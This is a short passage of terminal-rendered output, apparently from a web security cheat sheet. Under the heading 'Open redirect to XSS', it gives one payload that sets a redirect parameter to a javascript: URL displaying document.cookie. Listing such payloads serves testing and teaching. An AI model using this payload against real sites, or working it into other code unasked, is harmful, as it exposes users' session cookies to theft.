[34m│[0m                                                                              [34m│[0m
[34m│[0m **Open redirect to XSS:**                                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=javascript:alert(document.cookie)                                  [34m│[0m
